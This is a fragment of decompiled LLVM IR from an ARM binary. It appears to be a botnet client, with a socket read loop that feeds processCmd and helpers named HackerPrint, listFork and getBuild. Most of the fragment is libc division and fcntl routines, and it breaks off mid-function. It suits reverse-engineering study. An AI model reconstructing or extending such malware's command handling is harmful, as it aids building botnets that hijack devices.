dec_label_pc_13c30:                               ; preds = %dec_label_pc_13c10, %dec_label_pc_13b1c
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_13b1c ], [ %stack_var_-40.0, %dec_label_pc_13c10 ]
  %v3_13c3c = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* %v2_13c3c)
  %v7_13c48 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_13c48, label %dec_label_pc_13ca0, label %dec_label_pc_13c60.lr.ph

dec_label_pc_13c60.lr.ph:                         ; preds = %dec_label_pc_13c30
  br label %dec_label_pc_13c60

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c60.lr.ph, %dec_label_pc_13c60
  %storemerge18115 = phi i32 [ 1, %dec_label_pc_13c60.lr.ph ], [ %v1_13c88, %dec_label_pc_13c60 ]
  %v3_13c68 = mul i32 %storemerge18115, 4
  %v2_13c74 = add i32 %v2_13c70, %v3_13c68
  %v1_13c78 = inttoptr i32 %v2_13c74 to i32*
  %v2_13c78 = load i32, i32* %v1_13c78, align 4
  store i32 %v2_13c78, i32* @r0, align 4
  %v0_13c80 = call i32 @free()
  %v1_13c88 = add nuw nsw i32 %storemerge18115, 1
  %v5_13c9c = icmp slt i32 %v1_13c88, %stack_var_-40.1.lcssa
  br i1 %v5_13c9c, label %dec_label_pc_13c60, label %dec_label_pc_13ca0

dec_label_pc_13ca0:                               ; preds = %dec_label_pc_13c60, %dec_label_pc_13a38, %dec_label_pc_13870, %dec_label_pc_13c30, %dec_label_pc_138cc, %dec_label_pc_13820, %dec_label_pc_13490
  %v2_13ca4 = load i32, i32* @global_var_324c8.59, align 4
  %v5_13cc0 = call i32 @recvLine(i32 %v2_13ca4, i8* %v4_13cc0, i32 4096, i32 %v2_13cb0)
  %v3_13cd0 = icmp eq i32 %v5_13cc0, -1
  br i1 %v3_13cd0, label %dec_label_pc_13474, label %dec_label_pc_13748

; uselistorder directives
  uselistorder i32 %v5_13cc0, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v2_13c18, { 1, 0 }
  uselistorder i8* %stack_var_-36.043, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.141, { 1, 3, 0, 2 }
  uselistorder i8* %v5_13a14, { 1, 0 }
  uselistorder i32 %v1_13a10, { 1, 0 }
  uselistorder i8* %storemerge936, { 1, 0 }
  uselistorder i32 %v1_139d8, { 1, 0 }
  uselistorder i32 %v1_13944, { 2, 1, 0 }
  uselistorder i8* %v5_13914, { 5, 6, 0, 3, 2, 1, 4, 7, 9, 8 }
  uselistorder i32 %v1_13910, { 0, 2, 1, 3 }
  uselistorder i8* %storemerge10, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_13784, { 1, 0 }
  uselistorder i32 %v3_13750, { 1, 0 }
  uselistorder i32 %storemerge16, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_13670, { 1, 0 }
  uselistorder i32 %v1_13654, { 1, 0 }
  uselistorder i32 %v1_13528, { 1, 2, 0, 3 }
  uselistorder i32 %v3_13544, { 1, 0 }
  uselistorder i32 %v2_13538, { 1, 0 }
  uselistorder i32 %v2_13c70, { 2, 0, 1 }
  uselistorder i32 %v2_13a50, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_13cc0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_13cb0, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-132, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_324d0.65, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_391f4.68, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 11, 9, 10 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 1, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 17, 16, 0 }
  uselistorder i32* @global_var_324c8.59, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 ()* @__getpid, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 2, 3, 4, 5, 6, 26, 27 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_391e8.487, { 1, 2, 0, 5, 3, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_13ca0, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_13c60, { 1, 0 }
  uselistorder label %dec_label_pc_13c10, { 1, 0 }
  uselistorder label %dec_label_pc_13b48, { 1, 0 }
  uselistorder label %dec_label_pc_13b1c, { 1, 0 }
  uselistorder label %dec_label_pc_13ae4, { 1, 0 }
  uselistorder label %dec_label_pc_139ec, { 1, 0 }
  uselistorder label %dec_label_pc_139c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139b8, { 1, 0 }
  uselistorder label %dec_label_pc_13940, { 1, 0 }
  uselistorder label %dec_label_pc_138ac, { 1, 0 }
  uselistorder label %dec_label_pc_13870, { 1, 0 }
  uselistorder label %dec_label_pc_137bc, { 1, 0 }
  uselistorder label %dec_label_pc_1373c, { 1, 0 }
  uselistorder label %dec_label_pc_136ac, { 1, 0 }
  uselistorder label %dec_label_pc_1366c, { 1, 0 }
  uselistorder label %dec_label_pc_13578, { 1, 0 }
  uselistorder label %dec_label_pc_13534, { 1, 0 }
  uselistorder label %dec_label_pc_13474, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1345c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_132f8, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13d28 = load i32, i32* @r1, align 4
  %v1_13d28 = add i32 %v0_13d28, -1
  store i32 %v1_13d28, i32* %r2.global-to-local, align 4
  %v2_13d28 = icmp eq i32 %v0_13d28, 0
  %v7_13d28 = icmp eq i32 %v0_13d28, 1
  %v0_13d2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_13d28, i32 %v0_13d2c)
  br i1 %v2_13d28, label %dec_label_pc_13e10, label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %entry
  %v0_13d34 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d34 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_13d34, %v1_13d34
  br i1 %tmp, label %dec_label_pc_13d3c, label %dec_label_pc_13dc8

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d34
  %v1_13d3c = load i32, i32* %r2.global-to-local, align 4
  %v2_13d3c = and i32 %v1_13d3c, %v1_13d34
  %v4_13d3c = icmp eq i32 %v2_13d3c, 0
  br i1 %v4_13d3c, label %dec_label_pc_13dd4, label %dec_label_pc_13d44

dec_label_pc_13d44:                               ; preds = %dec_label_pc_13d3c
  %v3_13d44 = icmp ult i32 %v1_13d34, 536870912
  br i1 %v3_13d44, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13d44
  %v4_13d48 = mul i32 %v1_13d34, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13d44, %.thread
  %v0_13d68.pr36.ph = phi i32 [ %v4_13d48, %.thread ], [ %v1_13d34, %dec_label_pc_13d44 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13d44 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_13d68.pr36 = phi i32 [ %v4_13d5c, %bb81 ], [ %v0_13d68.pr36.ph, %.preheader.preheader ]
  %v1_13d60 = phi i32 [ %v4_13d60, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_13d54 = icmp ugt i32 %v0_13d68.pr36, 268435455
  br i1 %v2_13d54, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13d68thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_13d58 = icmp ult i32 %v0_13d68.pr36, %v0_13d34
  br i1 %v4_13d58, label %bb80, label %dec_label_pc_13d68thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_13d5c = and i32 %v0_13d68.pr36, 268435456
  %v3_13d5c = icmp eq i32 %v2_13d5c, 0
  %v4_13d5c = mul i32 %v0_13d68.pr36, 16
  br i1 %v3_13d5c, label %bb81, label %dec_label_pc_13d68.loopexit

bb81:                                             ; preds = %bb80
  %v2_13d60 = and i32 %v1_13d60, 268435456
  %v3_13d60 = icmp eq i32 %v2_13d60, 0
  %v4_13d60 = mul i32 %v1_13d60, 16
  br i1 %v3_13d60, label %.preheader, label %dec_label_pc_13d68thread-pre-split.loopexit.loopexit

dec_label_pc_13d68thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_13d7448.ph = phi i32 [ %v1_13d60, %bb ], [ %v4_13d60, %bb81 ]
  %v0_13d68.pr38.ph = phi i32 [ %v0_13d68.pr36, %bb ], [ %v4_13d5c, %bb81 ]
  br label %dec_label_pc_13d68thread-pre-split.loopexit

dec_label_pc_13d68thread-pre-split.loopexit:      ; preds = %dec_label_pc_13d68thread-pre-split.loopexit.loopexit, %.thread2
  %v1_13d7448 = phi i32 [ %v1_13d60, %.thread2 ], [ %v1_13d7448.ph, %dec_label_pc_13d68thread-pre-split.loopexit.loopexit ]
  %v0_13d68.pr38 = phi i32 [ %v0_13d68.pr36, %.thread2 ], [ %v0_13d68.pr38.ph, %dec_label_pc_13d68thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13d68thread-pre-split

dec_label_pc_13d68thread-pre-split:               ; preds = %dec_label_pc_13d68thread-pre-split.loopexit, %bb83
  %v1_13d7446 = phi i32 [ %v1_13d7448, %dec_label_pc_13d68thread-pre-split.loopexit ], [ %v3_13d74, %bb83 ]
  %v0_13d68.pr = phi i32 [ %v0_13d68.pr38, %dec_label_pc_13d68thread-pre-split.loopexit ], [ %v3_13d70, %bb83 ]
  br label %dec_label_pc_13d68

dec_label_pc_13d68.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_13d68

dec_label_pc_13d68:                               ; preds = %dec_label_pc_13d68.loopexit, %dec_label_pc_13d68thread-pre-split
  %v1_13d74 = phi i32 [ %v1_13d7446, %dec_label_pc_13d68thread-pre-split ], [ %v1_13d60, %dec_label_pc_13d68.loopexit ]
  %v1_13d70 = phi i32 [ %v0_13d68.pr, %dec_label_pc_13d68thread-pre-split ], [ %v4_13d5c, %dec_label_pc_13d68.loopexit ]
  %v2_13d68 = icmp slt i32 %v1_13d70, 0
  br i1 %v2_13d68, label %dec_label_pc_13d7c, label %bb82

bb82:                                             ; preds = %dec_label_pc_13d68
  %v4_13d6c = icmp ult i32 %v1_13d70, %v0_13d34
  br i1 %v4_13d6c, label %bb83, label %dec_label_pc_13d7c

bb83:                                             ; preds = %bb82
  %v3_13d70 = mul i32 %v1_13d70, 2
  %v2_13d74 = icmp slt i32 %v1_13d74, 0
  %v3_13d74 = mul i32 %v1_13d74, 2
  br i1 %v2_13d74, label %dec_label_pc_13d7c, label %dec_label_pc_13d68thread-pre-split

dec_label_pc_13d7c:                               ; preds = %bb82, %dec_label_pc_13d68, %bb83
  %v2_13d8859 = phi i32 [ %v3_13d74, %bb83 ], [ %v1_13d74, %bb82 ], [ %v1_13d74, %dec_label_pc_13d68 ]
  %v1_13d8051 = phi i32 [ %v3_13d70, %bb83 ], [ %v1_13d70, %bb82 ], [ %v1_13d70, %dec_label_pc_13d68 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d80

dec_label_pc_13d80:                               ; preds = %.thread11, %dec_label_pc_13d7c
  %v1_13db4 = phi i32 [ %v4_13db4, %.thread11 ], [ %v2_13d8859, %dec_label_pc_13d7c ]
  %v1_13d88 = phi i32 [ %v0_13dc0, %.thread11 ], [ 0, %dec_label_pc_13d7c ]
  %v1_13db8 = phi i32 [ %v4_13db8, %.thread11 ], [ %v1_13d8051, %dec_label_pc_13d7c ]
  %v1_13d84 = phi i32 [ %v0_13db0, %.thread11 ], [ %v0_13d34, %dec_label_pc_13d7c ]
  %v3_13d80 = icmp ult i32 %v1_13d84, %v1_13db8
  br i1 %v3_13d80, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_13d80
  %v3_13d84 = sub i32 %v1_13d84, %v1_13db8
  store i32 %v3_13d84, i32* %r0.global-to-local, align 4
  %v3_13d88 = or i32 %v1_13d88, %v1_13db4
  store i32 %v3_13d88, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13d80, %bb84
  %v1_13d90 = phi i32 [ %v1_13d84, %dec_label_pc_13d80 ], [ %v3_13d84, %bb84 ]
  %v1_13d94 = phi i32 [ %v1_13d88, %dec_label_pc_13d80 ], [ %v3_13d88, %bb84 ]
  %v4_13d8c = udiv i32 %v1_13db8, 2
  %v6_13d8c = icmp ult i32 %v1_13d90, %v4_13d8c
  br i1 %v6_13d8c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_13d90 = urem i32 %v1_13db8, 2
  %v4_13d90 = icmp eq i32 %v3_13d90, 0
  %v6_13d90 = sub i32 %v1_13d90, %v4_13d8c
  store i32 %v6_13d90, i32* %r0.global-to-local, align 4
  br i1 %v4_13d90, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_13d94 = udiv i32 %v1_13db4, 2
  %v6_13d94 = or i32 %v1_13d94, %v5_13d94
  store i32 %v6_13d94, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_13d9c = phi i32 [ %v6_13d90, %bb85 ], [ %v1_13d90, %.thread7 ], [ %v6_13d90, %bb86 ]
  %v1_13da0 = phi i32 [ %v1_13d94, %bb85 ], [ %v1_13d94, %.thread7 ], [ %v6_13d94, %bb86 ]
  %v4_13d98 = udiv i32 %v1_13db8, 4
  %v6_13d98 = icmp ult i32 %v1_13d9c, %v4_13d98
  br i1 %v6_13d98, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_13d9c = and i32 %v1_13db8, 2
  %v4_13d9c = icmp eq i32 %v3_13d9c, 0
  %v6_13d9c = sub i32 %v1_13d9c, %v4_13d98
  store i32 %v6_13d9c, i32* %r0.global-to-local, align 4
  br i1 %v4_13d9c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_13da0 = udiv i32 %v1_13db4, 4
  %v6_13da0 = or i32 %v1_13da0, %v5_13da0
  store i32 %v6_13da0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_13da8 = phi i32 [ %v6_13d9c, %bb87 ], [ %v1_13d9c, %.thread8 ], [ %v6_13d9c, %bb88 ]
  %v1_13dac = phi i32 [ %v1_13da0, %bb87 ], [ %v1_13da0, %.thread8 ], [ %v6_13da0, %bb88 ]
  %v4_13da4 = udiv i32 %v1_13db8, 8
  %v6_13da4 = icmp ult i32 %v1_13da8, %v4_13da4
  br i1 %v6_13da4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_13da8 = and i32 %v1_13db8, 4
  %v4_13da8 = icmp eq i32 %v3_13da8, 0
  %v6_13da8 = sub i32 %v1_13da8, %v4_13da4
  store i32 %v6_13da8, i32* %r0.global-to-local, align 4
  br i1 %v4_13da8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13dac = udiv i32 %v1_13db4, 8
  %v6_13dac = or i32 %v1_13dac, %v5_13dac
  store i32 %v6_13dac, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_13dc0 = phi i32 [ %v1_13dac, %bb89 ], [ %v1_13dac, %.thread9 ], [ %v6_13dac, %bb90 ]
  %v0_13db0 = phi i32 [ %v6_13da8, %bb89 ], [ %v1_13da8, %.thread9 ], [ %v6_13da8, %bb90 ]
  %v2_13db0 = icmp eq i32 %v0_13db0, 0
  br i1 %v2_13db0, label %dec_label_pc_13dc0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_13db4, 16
  br i1 %tmp138, label %dec_label_pc_13dc0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_13db4 = udiv i32 %v1_13db4, 16
  %v4_13db8 = udiv i32 %v1_13db8, 16
  br label %dec_label_pc_13d80

dec_label_pc_13dc0:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_13dc0, i32* %r0.global-to-local, align 4
  ret i32 %v0_13dc0

dec_label_pc_13dc8:                               ; preds = %dec_label_pc_13d34
  %v9_13d34 = icmp eq i32 %v0_13d34, %v1_13d34
  %. = zext i1 %v9_13d34 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_13dd4:                               ; preds = %dec_label_pc_13d3c
  %v2_13dd4 = icmp ugt i32 %v1_13d34, 65535
  br i1 %v2_13dd4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_13dd4
  %v2_13dd8 = and i32 %v1_13d34, 32768
  %v3_13dd8 = icmp eq i32 %v2_13dd8, 0
  %v4_13dd8 = udiv i32 %v1_13d34, 65536
  br i1 %v3_13dd8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_13dd4
  %v0_13de465 = phi i32 [ %v1_13d34, %dec_label_pc_13dd4 ], [ %v4_13dd8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_13de8 = phi i32 [ %v0_13de465, %.thread16 ], [ %v4_13dd8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13de4 = icmp ugt i32 %v1_13de8, 255
  br i1 %v2_13de4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_13de8 = and i32 %v1_13de8, 128
  %v3_13de8 = icmp eq i32 %v2_13de8, 0
  %v4_13de8 = udiv i32 %v1_13de8, 256
  br i1 %v3_13de8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_13dec = or i32 %storemerge, 8
  store i32 %v2_13dec, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_13df8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_13dec, %bb98 ]
  %v1_13df4 = phi i32 [ %v1_13de8, %bb96 ], [ %v4_13de8, %bb97 ], [ %v4_13de8, %bb98 ]
  %v2_13df0 = icmp ugt i32 %v1_13df4, 15
  br i1 %v2_13df0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_13df4 = and i32 %v1_13df4, 8
  %v3_13df4 = icmp eq i32 %v2_13df4, 0
  %v4_13df4 = udiv i32 %v1_13df4, 16
  br i1 %v3_13df4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13df8 = add nsw i32 %v1_13df8, 4
  store i32 %v2_13df8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_13e00 = phi i32 [ %v1_13df8, %.thread17 ], [ %v1_13df8, %bb99 ], [ %v2_13df8, %bb100 ]
  %v5_13e04 = phi i32 [ %v1_13df4, %.thread17 ], [ %v4_13df4, %bb99 ], [ %v4_13df4, %bb100 ]
  %v2_13dfc = icmp ugt i32 %v5_13e04, 3
  %v7_13dfc = icmp eq i32 %v5_13e04, 4
  %v2_13e00 = xor i1 %v7_13dfc, true
  %v3_13e00 = and i1 %v2_13dfc, %v2_13e00
  br i1 %v3_13e00, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_13e00 = add nsw i32 %v4_13e00, 3
  store i32 %v5_13e00, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_13e04 = phi i32 [ %v4_13e00, %.thread18 ], [ %v5_13e00, %bb101 ]
  %v2_13e04 = xor i1 %v2_13dfc, true
  %v3_13e04 = or i1 %v7_13dfc, %v2_13e04
  br i1 %v3_13e04, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_13e04 = udiv i32 %v5_13e04, 2
  %v9_13e04 = add i32 %v4_13e04, %v8_13e04
  store i32 %v9_13e04, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_13e08 = phi i32 [ %v4_13e04, %bb102 ], [ %v9_13e04, %bb103 ]
  %v6_13e08 = lshr i32 %v0_13d34, %v1_13e08
  store i32 %v6_13e08, i32* %r0.global-to-local, align 4
  ret i32 %v6_13e08

dec_label_pc_13e10:                               ; preds = %entry
  %v0_13e14 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13e04, { 1, 0 }
  uselistorder i1 %v7_13dfc, { 1, 0 }
  uselistorder i32 %v4_13df4, { 1, 0 }
  uselistorder i32 %v1_13df4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13dec, { 1, 0 }
  uselistorder i32 %v4_13de8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13de8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13dd8, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_13db0, { 1, 0 }
  uselistorder i32 %v0_13dc0, { 1, 0, 2 }
  uselistorder i32 %v4_13da4, { 1, 0 }
  uselistorder i32 %v1_13dac, { 1, 2, 0 }
  uselistorder i32 %v4_13d98, { 1, 0 }
  uselistorder i32 %v1_13da0, { 1, 2, 0 }
  uselistorder i32 %v4_13d8c, { 1, 0 }
  uselistorder i32 %v1_13d94, { 1, 2, 0 }
  uselistorder i32 %v1_13db8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13d88, { 1, 0 }
  uselistorder i32 %v1_13db4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13d74, { 1, 0 }
  uselistorder i32 %v3_13d70, { 1, 0 }
  uselistorder i32 %v1_13d70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13d74, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13d60, { 1, 0 }
  uselistorder i32 %v4_13d5c, { 2, 1, 0 }
  uselistorder i32 %v1_13d60, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13d68.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_13d34, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_13d34, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_13d28, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13dc0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13d7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d68thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_13e28 = udiv i32 %arg1, %arg2
  ret i32 %v2_13e28
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_13e44 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_13e44
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_13e60 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13e60, 2
  br i1 %tmp, label %dec_label_pc_13e9c, label %dec_label_pc_13e78

dec_label_pc_13e78:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_13ed0, label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %dec_label_pc_13e78
  %v0_13e90 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_13ec4

dec_label_pc_13e9c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_13eb8, label %dec_label_pc_13ed0

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e9c
  %v0_13ebc = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_13ec4

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13e8c, %dec_label_pc_13eb8
  %storemerge2 = phi i32 [ %v0_13e90, %dec_label_pc_13e8c ], [ %v0_13ebc, %dec_label_pc_13eb8 ]
  %storemerge.in = load i16, i16* @global_var_32088.1320, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_13ec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ec4 = sub i32 0, %v0_13ec4
  store i32 %v1_13ec4, i32* %r2.global-to-local, align 4
  %v3_13ec8 = add i32 %storemerge, %storemerge2
  %v4_13ec8 = inttoptr i32 %v3_13ec8 to i32*
  store i32 %v1_13ec4, i32* %v4_13ec8, align 4
  br label %dec_label_pc_13ed0

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13e78, %dec_label_pc_13e9c, %dec_label_pc_13ec4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_13ec4 ], [ %arg1, %dec_label_pc_13e9c ], [ %arg1, %dec_label_pc_13e78 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_13ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ec4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_13ee8 = load i32, i32* @r2, align 4
  %v3_13eec = load i32, i32* @r4, align 4
